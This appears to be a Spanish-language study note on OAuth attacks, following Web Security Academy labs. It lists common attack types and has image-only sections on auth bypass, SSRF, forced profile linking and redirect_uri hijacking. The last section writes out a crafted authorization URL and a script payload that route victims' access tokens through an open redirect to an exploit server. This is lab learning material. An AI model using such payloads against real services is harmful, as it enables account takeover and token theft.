 OAuth, al ser un protocolo ampliamente utilizado para la autorización segura, también presenta ciertos riesgos y vectores de ataque que los atacantes pueden intentar explotar. A continuación, se describen algunos de los ataques comunes contra OAuth y las medidas de mitigación recomendadas para proteger contra estos ataques.

### Ataques Comunes contra OAuth

1. **Ataque de Redirección Maliciosa**
2. **Ataques de Phishing**
3. **Reutilización del Código de Autorización**
4. **Manipulación del Token de Acceso**
5. **Ataques de Intercepción (Man-in-the-Middle)**
6. **Ataque de Falsificación de Solicitud del Lado del Servidor (SSRF)**
7. **Confusión de Confianza**
# Omisión de autenticación mediante flujo implícito de OAuth

![[01.OmisiondeAutenticacion.png]]
![[02.OmisiondeAutenticacion.png]]
![[03.OmisiondeAutenticacion.png]]
![[04.OmisiondeAutenticacion.png]]
![[05.OmisiondeAutenticacion.png]]
![[06.OmisiondeAutenticacion.png]]

# SSRF a través del registro dinámico de clientes OpenID

![[01.SSRF_OpenID.png]]
![[02.SSRF_OpenID.png]]
![[03.SSRF_OpenID.png]]
![[04.SSRF_OpenID.png]]
![[05.SSRF_OpenID.png]]
![[06.SSRF_OpenID.png]]
![[07.SSRF_OpenID.png]]
![[08.SSRF_OpenID.png]]
![[09.SSRF_OpenID.png]]
![[10.SSRF_OpenID.png]]
![[11.SSRF_OpenID.png]]
![[12.SSRF_OpenID.png]]

# Vinculación forzada de perfiles OAuth

![[01.VinculacionForzada.png]]
![[02.VinculacionForzada.png]]
![[03.VinculacionForzada.png]]
![[04.VinculacionForzada.png]]
![[05.VinculacionForzada.png]]
![[06.VinculacionForzada.png]]
![[07.VinculacionForzada.png]]
![[08.VinculacionForzada.png]]
![[09.VinculacionForzada.png]]

# Secuestro de cuentas OAuth a través de redirect_uri

![[01.Secuestro_Cuentas.png]]
![[02.Secuestro_Cuentas.png]]
![[03.Secuestro_Cuentas.png]]
![[04.Secuestro_Cuentas.png]]
![[05.Secuestro_Cuentas.png]]

# Robo de tokens de acceso OAuth a través de una redirección abierta

![[Pasted image 20240730200038.png]]
![[Pasted image 20240730200205.png]]

 `https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
![[Pasted image 20240730201526.png]]
![[Pasted image 20240730202411.png]]
```
<script> if (!document.location.hash) { window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email' } else { window.location = '/?'+document.location.hash.substr(1) } </script>
```
![[Pasted image 20240730202920.png]]

Volvemos a ingresar a esta direccion con los cambios

`https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
![[Pasted image 20240730205540.png]]
![[Pasted image 20240730205803.png]]
![[Pasted image 20240730205817.png]]
![[Pasted image 20240801004134.png]]
![[Pasted image 20240801004156.png]]
